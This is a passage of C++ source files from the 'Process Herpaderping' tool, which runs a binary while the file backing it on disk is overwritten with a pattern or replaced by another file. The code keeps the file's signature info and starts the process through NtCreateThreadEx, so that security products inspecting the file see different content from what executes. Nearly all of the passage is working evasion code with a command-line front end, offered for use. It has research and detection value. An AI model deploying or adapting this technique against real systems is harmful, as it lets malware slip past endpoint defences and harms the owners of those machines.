        if (FAILED(hr))
        {
            if (hr != HRESULT_FROM_WIN32(ERROR_USER_MAPPED_FILE))
            {
                Utils::Log(Log::Error, 
                           hr,
                           L"Failed to replace target file");
                RETURN_HR(hr);
            }

            //
            // This error occurs when trying to truncate a file that has a
            // user mapping open. In other words, the file we tried to replace
            // with was smaller than the original.
            // Let's fix up the replacement to hide the original bytes and 
            // retain any signer info.
            //
            Utils::Log(Log::Information,
                       L"Fixing up target replacement, "
                       L"hiding original bytes and retaining any signature");

            uint64_t replaceWithSize;
            hr = Utils::GetFileSize(replaceWithHandle.get(), replaceWithSize);
            if (FAILED(hr))
            {
                Utils::Log(Log::Error, 
                           hr,
                           L"Failed to get replace with file size");
                RETURN_HR(hr);
            }

            uint32_t bytesWritten = 0;
            hr = Utils::OverwriteFileAfterWithPattern(
                                                targetHandle.get(),
                                                replaceWithSize,
                                                Pattern,
                                                bytesWritten,
                                                FlagOn(Flags, FlagFlushFile));
            if (FAILED(hr))
            {
                Utils::Log(Log::Warning, 
                           hr,
                           L"Failed to hide original file bytes");
            }
            else
            {
                hr = Utils::ExtendFileSecurityDirectory(
                                                targetHandle.get(),
                                                bytesWritten,
                                                FlagOn(Flags, FlagFlushFile));
                if (FAILED(hr))
                {
                    Utils::Log(Log::Warning,
                               hr,
                               L"Failed to retain file signature");
                }
            }
        }
    }
    else
    {
        //
        // (B) Just overwrite the target binary with a pattern.
        //
        Utils::Log(Log::Success, L"Overwriting target with pattern");

        hr = Utils::OverwriteFileContentsWithPattern(
                                                targetHandle.get(),
                                                Pattern,
                                                FlagOn(Flags, FlagFlushFile));
        if (FAILED(hr))
        {
            Utils::Log(Log::Error, 
                       hr, 
                       L"Failed to write pattern over file");
            RETURN_HR(hr);
        }
    }

    //
    // Alright, at this point the process is going to be derpy enough.
    // Do the work necessary to make it execute.
    //
    Utils::Log(Log::Success, L"Preparing target for execution");

    PROCESS_BASIC_INFORMATION pbi{};
    status = NtQueryInformationProcess(processHandle.get(),
                                       ProcessBasicInformation,
                                       &pbi,
                                       sizeof(pbi),
                                       nullptr);
    if (!NT_SUCCESS(status))
    {
        RETURN_NTSTATUS(Utils::Log(Log::Error, 
                                   status, 
                                   L"Failed to query new process info"));
    }

    PEB peb{};
    if (!ReadProcessMemory(processHandle.get(),
                           pbi.PebBaseAddress,
                           &peb,
                           sizeof(peb),
                           nullptr))
    {
        RETURN_LAST_ERROR_SET(Utils::Log(Log::Error, 
                                         GetLastError(), 
                                         L"Failed to read remote process PEB"));
    }

    Utils::Log(Log::Information,
               L"Writing process parameters, remote PEB ProcessParameters 0x%p",
               Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)));

    hr = Utils::WriteRemoteProcessParameters(
                               processHandle.get(),
                               TargetFileName,
                               std::nullopt,
                               std::nullopt,
                               (L"\"" + TargetFileName + L"\""),
                               NtCurrentPeb()->ProcessParameters->Environment,
                               TargetFileName,
                               L"WinSta0\\Default",
                               std::nullopt,
                               std::nullopt);
    if (FAILED(hr))
    {
        Utils::Log(Log::Error, 
                   hr, 
                   L"Failed to write remote process parameters");
        RETURN_HR(hr);
    }

    if (FlagOn(Flags, FlagCloseFileEarly))
    {
        //
        // Caller wants to close the file early, before the notification
        // callback in the kernel would fire, do so.
        //
        targetHandle.reset();
    }

    //
    // Create the initial thread, when this first thread is inserted the
    // process create callback will fire in the kernel.
    //
    void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);

    Utils::Log(Log::Information,
               L"Creating thread in process at entry point 0x%p",
               remoteEntryPoint);

    wil::unique_handle threadHandle;
    status = NtCreateThreadEx(&threadHandle,
                              THREAD_ALL_ACCESS,
                              nullptr,
                              processHandle.get(),
                              remoteEntryPoint,
                              nullptr,
                              0,
                              0,
                              0,
                              0,
                              nullptr);
    if (!NT_SUCCESS(status))
    {
        threadHandle.release();
        RETURN_NTSTATUS(Utils::Log(Log::Error, 
                                   status, 
                                   L"Failed to create remote thread"));
    }

    Utils::Log(Log::Information,
               L"Created thread, TID %lu",
               GetThreadId(threadHandle.get()));

    if (!FlagOn(Flags, FlagKillSpawnedProcess))
    {
        //
        // Process was executed successfully. Do not terminate.
        //
        terminateProcess.release();
    }

    if (!FlagOn(Flags, FlagHoldHandleExclusive))
    {
        //
        // We're done with the target file handle. At this point the process 
        // create callback will have fired in the kernel.
        //
        targetHandle.reset();
    }

    if (FlagOn(Flags, FlagWaitForProcess))
    {
        //
        // Wait for the process to exit.
        //
        Utils::Log(Log::Success, L"Waiting for herpaderped process to exit");

        WaitForSingleObject(processHandle.get(), INFINITE);

        DWORD targetExitCode = 0;
        GetExitCodeProcess(processHandle.get(), &targetExitCode);

        Utils::Log(Log::Success,
                   L"Herpaderped process exited with code 0x%08x",
                   targetExitCode);
    }
    else
    {
        Utils::Log(Log::Success, L"Successfully spawned herpaderped process");
    }

    return S_OK;
}

```

`source/ProcessHerpaderping/herpaderp.hpp`:

```hpp
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/herpaderp.hpp
// Author:   Johnny Shaw
// Abstract: Herpaderping Functionality
//
#pragma once

namespace Herpaderp
{
#pragma warning(push)
#pragma warning(disable : 4634)  // xmldoc: discarding XML document comment for invalid target 
    /// <summary>
    /// Waits for process to exit before returning.
    /// </summary>
    constexpr static uint32_t FlagWaitForProcess = 0x00000001ul;

    /// <summary>
    /// Opens and hold the target file handle exclusive for as long as 
    /// reasonable. This flag is incompatible with FlagCloseFileEarly.
    /// </summary>
    constexpr static uint32_t FlagHoldHandleExclusive = 0x00000002ul;

    /// <summary>
    /// Flushes file buffers of target file.
    /// </summary>
    constexpr static uint32_t FlagFlushFile = 0x00000004ul;

    /// <summary>
    /// Closes the file handle early, before creating the initial thread 
    /// (before process notification would fire in the kernel). This flag is 
    /// not compatible with FlagHoldHandleExclusive.
    /// </summary>
    constexpr static uint32_t FlagCloseFileEarly = 0x00000008ul;

    /// <summary>
    /// Terminates the spawned process on success, this can be useful in some 
    /// automation environments. Not compatible with FlagWaitForProcess.
    /// </summary>
    constexpr static uint32_t FlagKillSpawnedProcess = 0x00000010ul;

    /// <summary>
    /// The target file is created as a directory and the execution occurs from
    /// an alternate data stream from the directory.
    /// </summary>
    constexpr static uint32_t FlagDirectory = 0x00000020ul;
#pragma warning(pop)

    /// <summary>
    /// Executes process herpaderping.
    /// </summary>
    /// <param name="SourceFileName">
    /// Source binary to execute.
    /// </param>
    /// <param name="TargetFileName">
    /// File name to copy source to and obfuscate.
    /// </param>
    /// <param name="ReplaceWithFileName">
    /// Optional, if provided the file is replaced with the content of this 
    /// file. If not provided the file is overwritten with a pattern.
    /// </param>
    /// <param name="Pattern">
    /// Pattern used for obfuscation.
    /// </param>
    /// <param name="Flags">
    /// Flags controlling behavior of herpaderping (Herpaderp::FlagXxx).
    /// </param>
    /// <returns>
    /// Success if the herpaderping executed. Failure otherwise.
    /// </returns>
    _Must_inspect_result_ HRESULT ExecuteProcess(
        _In_ const std::wstring& SourceFileName,
        _In_ const std::wstring& TargetFileName,
        _In_opt_ const std::optional<std::wstring>& ReplaceWithFileName,
        _In_ std::span<const uint8_t> Pattern, 
        _In_ uint32_t Flags);

}

```

`source/ProcessHerpaderping/main.cpp`:

```cpp
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/main.cpp
// Author:   Johnny Shaw
// Abstract: Process Herpaderping Tool 
//
#include "pch.hpp"
#include "utils.hpp"
#include "herpaderp.hpp"

namespace Constants 
{
    constexpr static std::wstring_view ToolHeader
    {
        WSTR_FILE_DESCRIPTION L" - " WSTR_COPYRIGHT
    };

    constexpr static std::array<uint8_t, 4> Pattern{ '\x72', '\x6f', '\x66', '\x6c' };

    constexpr static size_t RandPatterLen{ 0x200 };
}

/// <summary>
/// Class for parsing and storing process herpaderping tool arguments. 
/// </summary>
class Parameters : public Utils::IArgumentParser
{
public:
    constexpr static std::wstring_view Usage
    {
WSTR_ORIGINAL_FILENAME L" SourceFile TargetFile [ReplacedWith] [Options...]\n"
L"Usage:\n"
L"  SourceFile               Source file to execute.\n"
L"  TargetFile               Target file to execute the source from.\n"
L"  ReplacedWith             File to replace the target with. Optional,\n"
L"                           default overwrites the binary with a pattern.\n"
L"  -h,--help                Prints tool usage.\n"
L"  -d,--do-not-wait         Does not wait for spawned process to exit,\n"
L"                           default waits.\n"
L"  -l,--logging-mask number Specifies the logging mask, defaults to full\n" 
L"                           logging.\n"
L"                               0x1   Successes\n"
L"                               0x2   Informational\n"
L"                               0x4   Warnings\n"
L"                               0x8   Errors\n"
L"                               0x10  Contextual\n"
L"  -q,--quiet               Runs quietly, overrides logging mask, no title.\n"
L"  -r,--random-obfuscation  Uses random bytes rather than a pattern for\n"
L"                           file obfuscation.\n"
L"  -e,--exclusive           Target file is created with exclusive access and\n"
L"                           the handle is held open as long as possible.\n"
L"                           Without this option the handle has full share\n"
L"                           access and is closed as soon as possible.\n"
L"  -u,--do-not-flush-file   Does not flush file after overwrite.\n"
L"  -c,--close-file-early    Closes file before thread creation (before the\n"
L"                           process notify callback fires in the kernel).\n"
L"                           Not valid with \"--exclusive\" option.\n"
L"  -k,--kill                Terminates the spawned process regardless of\n"
L"                           success or failure, this is useful in some\n"
L"                           automation environments. Forces \"--do-not-wait\n"
L"                           option.\n"
L"  -i,--directory           Target file is created as a directory then the\n"
L"                           source is written to an ASD on that directory.\n"
L"                           The ADS is then mapped and executed."
    };

    Parameters() = default;

    /// <summary>
    /// Parses command line arguments and stores the data in the class.
    /// </summary>
    /// <param name="Argc">
    /// Number of command line arguments.
    /// </param>
    /// <param name="Argv">
    /// Command line arguments.
    /// </param>
    /// <returns>
    /// Success if arguments were parsed successfully. Failure otherwise.
    /// </returns>
    _Must_inspect_result_ virtual HRESULT ParseArguments(
        _In_ int Argc,
        _In_reads_(Argc) const wchar_t* Argv[]) override
    {
        if (Argc < 3)
        {
            return E_INVALIDARG;
        }

        m_TargetBinary = Argv[1];
        m_FileName = Argv[2];

        for (int i = 3; i < Argc; i++)
        {
            std::wstring arg = Argv[i];

            //
            // Check for optional flags.
            //
            if (SUCCEEDED(Utils::MatchParameter(arg, L"l", L"logging-mask")))
            {
                i++;
                if (i >= Argc)
                {
                    return E_INVALIDARG;
                }
                try
                {
                    m_LoggingMask = std::stoul(Argv[i], 0, 0);
                }
                catch (...)
                {
                    //
                    // Invalid number...
                    //
                    return E_INVALIDARG;
                }
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"d", L"do-not-wait")))
            {
                ClearFlag(m_HerpaderpFlags, Herpaderp::FlagWaitForProcess);
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"q", L"quiet")))
            {
                m_Quiet = true;
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"r", L"random-obfuscation")))
            {
                m_RandomObfuscation = true;
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"e", L"exclusive")))
            {
                SetFlag(m_HerpaderpFlags, Herpaderp::FlagHoldHandleExclusive);
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"u", L"do-not-flush-file")))
            {
                ClearFlag(m_HerpaderpFlags, Herpaderp::FlagFlushFile);
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"c", L"close-file-early")))
            {
                SetFlag(m_HerpaderpFlags, Herpaderp::FlagCloseFileEarly);
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"k", L"kill")))
            {
                SetFlag(m_HerpaderpFlags, Herpaderp::FlagKillSpawnedProcess);
                ClearFlag(m_HerpaderpFlags, Herpaderp::FlagWaitForProcess);
                continue;
            }
            if (SUCCEEDED(Utils::MatchParameter(arg, L"i", L"directory")))
            {
                SetFlag(m_HerpaderpFlags, Herpaderp::FlagDirectory);
                continue;
            }

            //
            // Assume replace with target.
            //
            m_ReplaceWith = arg;
        }

        return S_OK;
    }

    _Must_inspect_result_ virtual HRESULT ValidateArguments() const override
    {
        if (FlagOn(m_HerpaderpFlags, Herpaderp::FlagHoldHandleExclusive) &&
            FlagOn(m_HerpaderpFlags, Herpaderp::FlagCloseFileEarly))
        {
            //
            // These options are incompatible.
            //
            return E_FAIL;
        }
        return S_OK;
    }

    /// <summary>Gets the tool usage string.</summary>
    /// <returns>Tool usage string.</returns>
    virtual std::wstring_view GetUsage() const override
    {
        return Usage;
    }

    /// <summary>Gets the target binary string.</summary>
    /// <returns>Target binary string.</returns>
    const std::wstring& TargetBinary() const
    {
        return m_TargetBinary;
    }

    /// <summary>Gets the file name string.</summary>
    /// <returns>File name string.</returns>
    const std::wstring& FileName() const
    {
        return m_FileName;
    }

    /// <summary>Gets the replace with string.</summary>
    /// <returns>Replace with string.</returns>
    const std::optional<std::wstring>& ReplaceWith() const
    {
        return m_ReplaceWith;
    }

    /// <summary>Gets the logging bit mask.</summary>
    /// <returns>Logging bit mask.</returns>
    uint32_t LoggingMask() const
    {
        return m_LoggingMask;
    }

    /// <summary>Gets the quiet boolean.</summary>
    /// <returns>Quiet boolean.</returns>
    bool Quiet() const
    {
        return m_Quiet;
    }

    /// <summary>Gets the random obfuscation boolean.</summary>
    /// <returns>Random obfuscation boolean.</returns>
    bool RandomObfuscation() const
    {
        return m_RandomObfuscation;
    }

    /// <summary>Gets herpaderp flags.</summary>
    /// <returns>Herpaderp flags.</returns>
    uint32_t HerpaderpFlags() const
    {
        return m_HerpaderpFlags;
    }
    
private:

    std::wstring m_TargetBinary;
    std::wstring m_FileName;
    std::optional<std::wstring> m_ReplaceWith{ std::nullopt };
    uint32_t m_LoggingMask
    {
        Log::Success |
        Log::Information |
        Log::Warning |
        Log::Error |
        Log::Context
    };
    bool m_Quiet{ false };
    bool m_RandomObfuscation{ false };
    uint32_t m_HerpaderpFlags
    { 
        Herpaderp::FlagWaitForProcess | 
        Herpaderp::FlagFlushFile 
    };
};

/// <summary>
/// Main entry point for Process Herpaderping Tool.
/// </summary>
/// <param name="Argc">
/// Number of command line arguments.
/// </param>
/// <param name="Argv">
/// Command line arguments.
/// </param>
/// <returns>
/// EXIT_SUCCESS on success, EXIT_FAILURE on failure or invalid parameters.
/// </returns>
int wmain(
    _In_ int Argc, 
    _In_reads_(Argc) const wchar_t* Argv[])
{
    Parameters params;
    if (FAILED(Utils::HandleCommandLineArgs(Argc,
                                            Argv,
                                            Constants::ToolHeader,
                                            params)))
    {
        return EXIT_FAILURE;
    }

    if (params.Quiet())
    {
        //
        // Run quietly, no header and override the logging mask.
        //
        Utils::SetLoggingMask(0);
    }
    else
    {
        std::wcout << Constants::ToolHeader << L'\n';
        Utils::SetLoggingMask(params.LoggingMask());
    }

    //
    // Herpaderp wants a pattern to use for obfuscation, set that up here.
    //
    HRESULT hr;
    std::span<const uint8_t> pattern = Constants::Pattern;
    std::vector<uint8_t> patternBuffer;

    if (params.RandomObfuscation())
    {
        //
        // Use a random pattern instead.
        //
        patternBuffer.resize(Constants::RandPatterLen);
        hr = Utils::FillBufferWithRandomBytes(patternBuffer);
        if (FAILED(hr))
        {
            Utils::Log(Log::Error, 
                            hr,
                            L"Failed to generate random buffer");
            return EXIT_FAILURE;
        }
        pattern = std::span<const uint8_t>(patternBuffer);
    }

    hr = Herpaderp::ExecuteProcess(params.TargetBinary(), 
                                   params.FileName(), 
                                   params.ReplaceWith(), 
                                   pattern,
                                   params.HerpaderpFlags());
    if (FAILED(hr))
    {
        Utils::Log(Log::Error, hr, L"Process Herpaderp Failed");
        return EXIT_FAILURE;
    }

    Utils::Log(Log::Success, L"Process Herpaderp Succeeded");
    return EXIT_SUCCESS;
}

```

`source/ProcessHerpaderping/pch.hpp`:

```hpp
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     pch.hpp 
// Author:   Johnny Shaw
// Abstract: Pre-compiled Header 
//
#pragma once

//
// Windows
//
#define WIN32_LEAN_AND_MEAN
#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS
#include <ntstatus.h>
#include <strsafe.h>
#include <winioctl.h>
#include <bcrypt.h>

//
// STL
//
#include <cstdint>
#include <iostream>
#include <iomanip>
#include <string>
#include <sstream>
#include <array>
#include <vector>
#include <algorithm>
#include <functional>
#include <optional>
#include <span>

//
// Third Party
//
#pragma warning(push)
#pragma warning(disable : 6387)  // prefast: does not adhere to the specification for the function
#pragma warning(disable : 6001)  // prefast: using uninitialized memory 
#pragma warning(disable : 6388)  // prefast: data may not be value 
#pragma warning(disable : 4634)  // xmldoc: discarding XML document comment for invalid target 
#pragma warning(disable : 4635)  // xmldoc: badly-formatted XML 
#include <wil/common.h>
#include <wil/stl.h>
#include <wil/result.h>
#include <wil/resource.h>
#pragma warning(pop)
#pragma warning(push)
#pragma warning(disable : 4201)  // nameless struct/union
#pragma warning(disable : 4324)  // structure was padded due to __declspec(align())
#pragma warning(disable : 4471)  // a forward declaration of an unscoped enumeration
#pragma warning(disable : 28253) // prefast: Inconsistent annotation
#define PHNT_VERSION PHNT_THRESHOLD
#include <phnt/phnt_windows.h>
#include <phnt/phnt.h>
#include <phnt/ntpsapi.h>
#include <phnt/ntrtl.h>
#include <phnt/ntpebteb.h>
#pragma warning(pop)

//
// Common Macros/Defines/Usings
//
#define SCAST(_X_) static_cast<_X_>
#define RCAST(_X_) reinterpret_cast<_X_>
#define CCAST(_X_) const_cast<_X_>
#define DCAST(_X_) dynamic_cast<_X_>
#define Add2Ptr(_P_, _X_) RCAST(void*)(RCAST(uintptr_t)(_P_) + _X_)
#ifndef FlagOn
#define FlagOn(_F_, _X_) ((_F_) & (_X_))
#endif
#ifndef SetFlag
#define SetFlag(_F_, _X_) ((_F_) |= (_X_))
#endif
#ifndef ClearFlag
#define ClearFlag(_F_, _X_) ((_F_) &= ~(_X_))
#endif
using handle_t = HANDLE;

//
// wil extensions
//
namespace wil 
{
    using unique_user_process_parameters = unique_any<
        PRTL_USER_PROCESS_PARAMETERS,
        decltype(&RtlDestroyProcessParameters),
        RtlDestroyProcessParameters>;
}
#define RETURN_LAST_ERROR_SET(win32err) SetLastError(win32err); RETURN_LAST_ERROR()

//
// prefast suppression
//
#pragma warning(disable : 6319)  // prefast: use of the comma-operator in a tested expression

//
// Internal
//
#include "res/version.h"

```

`source/ProcessHerpaderping/res/resource.h`:

```h
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/res/resource.h
// Author:   Johnny Shaw
// Abstract: Resource Header 
//
#define IDI_ICON                        101

```

`source/ProcessHerpaderping/res/resource.rc`:

```rc
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/res/resource.rc
// Author:   Johnny Shaw
// Abstract: Resource File 
//
#include <Windows.h>
#include <ntverp.h>
#include "resource.h"
#include "version.h"

IDI_ICON                ICON                    "Icon.ico"


VS_VERSION_INFO VERSIONINFO
 FILEVERSION VER_MAJOR,VER_MINOR,VER_PATCH,VER_BUILD 
 PRODUCTVERSION VER_MAJOR,VER_MINOR,VER_PATCH,VER_BUILD
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", STR_COMPANY_NAME 
            VALUE "FileDescription", STR_FILE_DESCRIPTION
            VALUE "FileVersion", STR_VERSION
            VALUE "InternalName", STR_INTERNAL_NAME
            VALUE "LegalCopyright", STR_COPYRIGHT
            VALUE "OriginalFilename", STR_ORIGINAL_FILENAME
            VALUE "ProductName", STR_PRODUCT_NAME
            VALUE "ProductVersion", STR_PRODUCT_VERSION
    END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

```

`source/ProcessHerpaderping/res/version.h`:

```h
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/res/version.h
// Author:   Johnny Shaw
// Abstract: Version Header 
//
#pragma once
#define VER_MAJOR                       1
#define VER_MINOR                       0
#define VER_PATCH                       0
#define VER_BUILD                       1

#define MKSTR(_x_) #_x_
#define MKWSTR(_x_) L##_x_
#define VER_MAKE_STR(_Major_, _Minor_, _Patch_, _Build_)\
MKSTR(_Major_) "." \
MKSTR(_Minor_) "." \
MKSTR(_Patch_) "." \
MKSTR(_Build_)
#define VER_MAKE_WSTR(_Major_, _Minor_, _Patch_, _Build_)\
MKWSTR(_Major_) L"." \
MKWSTR(_Minor_) L"." \
MKWSTR(_Patch_) L"." \
MKWSTR(_Build_)

#define WSTR_COMPANY_NAME               L"Johnny Shaw"
#define STR_COMPANY_NAME                "Johnny Shaw"
#define WSTR_COPYRIGHT                  L"Copyright (c) 2020 Johnny Shaw"
#define STR_COPYRIGHT                   "Copyright (c) 2020 Johnny Shaw"
#define WSTR_ORIGINAL_FILENAME          L"ProcessHerpaderping.exe"
#define STR_ORIGINAL_FILENAME           "ProcessHerpaderping.exe"
#define WSTR_PRODUCT_NAME               L"Process Herpaderping Tool"
#define STR_PRODUCT_NAME                "Process Herpaderping Tool"
#define WSTR_FILE_DESCRIPTION           WSTR_PRODUCT_NAME
#define STR_FILE_DESCRIPTION            STR_PRODUCT_NAME
#define WSTR_INTERNAL_NAME              L"ProcessHerpaderping"
#define STR_INTERNAL_NAME               "ProcessHerpaderping"
#define WSTR_VERSION                    VER_MAKE_WSTR(VER_MAJOR, VER_MINOR, VER_PATCH, VER_BUILD)
#define STR_VERSION                     VER_MAKE_STR(VER_MAJOR, VER_MINOR, VER_PATCH, VER_BUILD)
#define WSTR_PRODUCT_VERSION            WSTR_VERSION
#define STR_PRODUCT_VERSION             STR_VERSION

```

`source/ProcessHerpaderping/utils.cpp`:

```cpp
//
// Copyright (c) Johnny Shaw. All rights reserved.
// 
// File:     source/ProcessHerpaderping/utils.cpp
// Author:   Johnny Shaw
// Abstract: Utility functionality for herpaderping. 
//
#include "pch.hpp"
#include "utils.hpp"

namespace Utils
{
    static uint32_t g_LoggingMask{ 0xffffffff };
    constexpr static uint32_t MaxFileBuffer{ 0x8000 }; // 32kib
}

_Use_decl_annotations_
HRESULT Utils::MatchParameter(
    std::wstring_view Arg,
    std::optional<std::wstring_view> Short,
    std::optional<std::wstring_view> Long)
{
    if (Arg.length() < 2)
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_PARAMETER);
    }

    if (Long.has_value() && (Arg[0] == L'-') && (Arg[1] == L'-'))
    {
        if (wcscmp(&Arg[2], Long->data()) == 0)
        {
            return S_OK;
        }
    }
    if (Short.has_value() && ((Arg[0] == L'-') || (Arg[0] == L'/')))
    {
        if (wcscmp(&Arg[1], Short->data()) == 0)
        {
            return S_OK;
        }
    }

    return E_FAIL;
}

_Use_decl_annotations_
HRESULT Utils::CheckForHelpOptions(
    int Argc,
    const wchar_t* Argv[])
{
    for (int i = 0; i < Argc; i++)
    {
        if (SUCCEEDED(MatchParameter(Argv[i], L"h", L"help")) || 
            SUCCEEDED(MatchParameter(Argv[i], L"?", std::nullopt)))
        {
            return S_OK;
        }
    }
    return E_NOT_SET;
}

_Use_decl_annotations_
HRESULT Utils::HandleCommandLineArgs(
    int Argc,
    const wchar_t* Argv[],
    std::optional<std::wstring_view> Header,
    IArgumentParser& Parser)
{
    if (SUCCEEDED(CheckForHelpOptions(Argc, Argv)) ||
        FAILED(Parser.ParseArguments(Argc, Argv)) ||
        FAILED(Parser.ValidateArguments()))
    {
        if (Header.has_value())
        {
            std::wcout << *Header << L'\n';
        }
        std::wcout << Parser.GetUsage();
        return E_FAIL;
    }

    return S_OK;
}

_Use_decl_annotations_
std::wstring Utils::FormatError(uint32_t Error)
{
    wil::unique_any<LPWSTR, decltype(&LocalFree), LocalFree> buffer;
    std::wstring message;
    auto length = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER |
                                     FORMAT_MESSAGE_FROM_SYSTEM |
                                     FORMAT_MESSAGE_IGNORE_INSERTS,
                                 nullptr,
                                 Error,
                                 MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                                 RCAST(LPWSTR)(&buffer),
                                 0,
                                 nullptr);
    if ((buffer != nullptr) && (length > 0))
    {
        message = std::wstring(buffer.get(), length);
    }
    else
    {
        length = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER |
                                    FORMAT_MESSAGE_FROM_SYSTEM |
                                    FORMAT_MESSAGE_FROM_HMODULE |
                                    FORMAT_MESSAGE_IGNORE_INSERTS,
                                GetModuleHandleA("ntdll.dll"),
                                Error,
                                MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                                RCAST(LPWSTR)(&buffer),
                                0,
                                nullptr);
        if ((buffer != nullptr) && (length > 0))
        {
            //
            // NT status codes are formatted with inserts, only use the 
            // initial description if there is one, otherwise just use the 
            // string as is.
            //
            message = std::wstring(buffer.get(), length);
            if (message[0] == L'{')
            {
                auto pos = message.find(L'}', 1);
                if (pos != std::wstring::npos)
                {
                    message = std::wstring(message.begin() + 1,
                                           message.begin() + pos);
                }
            }
        }
    }

    if (message.empty())
    {
        message = L"Unknown Error";
    }

    std::wstringstream ss;
    ss << L"0x"
       << std::hex << std::setfill(L'0') << std::setw(8) << Error 
       << L" - "
       << std::move(message);

    auto res = ss.str();
    EraseAll(res, { L'\r', L'\n', L'\t' });

    return res;
}

_Use_decl_annotations_
void Utils::SetLoggingMask(uint32_t Level)
{
    g_LoggingMask = Level;
}

static const wchar_t* GetLogLevelPrefix(_In_ uint32_t Level)
{
    if (Level & Log::Error)
    {
        return L"[ERROR] ";
    }
    else if (Level & Log::Warning)
    {
        return L"[WARN]  ";
    }
    else if (Level & Log::Information)
    {
        return L"[INFO]  ";
    }
    else if (Level & Log::Debug)
    {
        return L"[DEBUG] ";
    }

    return L"[OK]    ";
}

static void LogInternal(
    _In_ bool AppendError,
    _In_ uint32_t Error,
    _In_ uint32_t Level,
    _Printf_format_string_ const wchar_t* Format,
    _In_ va_list Args)
{
    if ((Level & Utils::g_LoggingMask) == 0)
    {
        return;
    }

    std::wstring line;
    if (Utils::g_LoggingMask & Log::Context)
    {
        wil::str_printf_nothrow(line, 
                                L"[%lu:%lu]",
                                GetCurrentProcessId(),
                                GetCurrentThreadId());
    }

    line += GetLogLevelPrefix(Level);

    std::wstring fmt;
    HRESULT hr = wil::details::str_vprintf_nothrow(fmt, Format, Args);
    if (FAILED(hr))
    {
        fmt = L"Formatting Error " + Utils::FormatError(hr);
    }
    line += std::move(fmt);

    if (AppendError)
    {
        line += L", ";
        line += Utils::FormatError(Error);
    }

    if (Level & Log::Error)
    {
        std::wcerr << line << L'\n';
    }
    else
    {
        std::wcout << line << L'\n';
    }
}

_Use_decl_annotations_
void Utils::Log(
    uint32_t Level, 
    const wchar_t* Format, 
    ...)
{
    va_list args;
    va_start(args, Format);
    LogInternal(false, 0, Level, Format, args);
    va_end(args);
}

_Use_decl_annotations_
uint32_t Utils::Log(
    uint32_t Level, 
    uint32_t Error, 
    const wchar_t* Format, 
    ...)
{
    va_list args;
    va_start(args, Format);
    LogInternal(true, Error, Level, Format, args);
    va_end(args);
    return Error;
}

_Use_decl_annotations_
HRESULT Utils::FillBufferWithPattern(
    std::vector<uint8_t>& Buffer,
    std::span<const uint8_t> Pattern)
{
    if (Buffer.empty())
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_PARAMETER);
    }

    auto bytesRemaining = Buffer.size();
    while (bytesRemaining > 0)
    {
        auto len = (Pattern.size() > bytesRemaining ? 
                    bytesRemaining 
                    : 
                    Pattern.size());

        std::memcpy(&Buffer[Buffer.size() - bytesRemaining],
                    Pattern.data(),
                    Pattern.size());

        bytesRemaining -= len;
    }

    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::FillBufferWithRandomBytes(
    std::vector<uint8_t>& Buffer)
{
    if (Buffer.empty())
    {
        RETURN_LAST_ERROR_SET(ERROR_INVALID_PARAMETER);
    }

    RETURN_IF_NTSTATUS_FAILED(
        BCryptGenRandom(nullptr,
                        Buffer.data(),
                        SCAST(ULONG)(Buffer.size()),
                        BCRYPT_USE_SYSTEM_PREFERRED_RNG));

    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::GetFileSize(
    handle_t FileHandle,
    uint64_t& FileSize)
{
    FileSize = 0;

    LARGE_INTEGER fileSize;
    RETURN_IF_WIN32_BOOL_FALSE(GetFileSizeEx(FileHandle, &fileSize));

    if (fileSize.QuadPart < 0)
    {
        RETURN_LAST_ERROR_SET(ERROR_FILE_INVALID);
    }

    FileSize = fileSize.QuadPart;
    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::SetFilePointer(
    handle_t FileHandle,
    int64_t DistanceToMove,
    uint32_t MoveMethod)
{
    LARGE_INTEGER distance;
    distance.QuadPart = DistanceToMove;

    RETURN_IF_WIN32_BOOL_FALSE_EXPECTED(SetFilePointerEx(FileHandle,
                                                         distance,
                                                         nullptr,
                                                         MoveMethod));
    return S_OK;
}

_Use_decl_annotations_
HRESULT Utils::CopyFileByHandle(
    handle_t SourceHandle, 
    handle_t TargetHandle,
    bool FlushFile)
{
    //
    // Get the file sizes.
    //
    uint64_t sourceSize;
    RETURN_IF_FAILED(GetFileSize(SourceHandle, sourceSize));

    uint64_t targetSize;
    RETURN_IF_FAILED(GetFileSize(TargetHandle, targetSize));

    //
    // Set the file pointers to the beginning of the files.
    //
    RETURN_IF_FAILED(SetFilePointer(SourceHandle, 0, FILE_BEGIN));
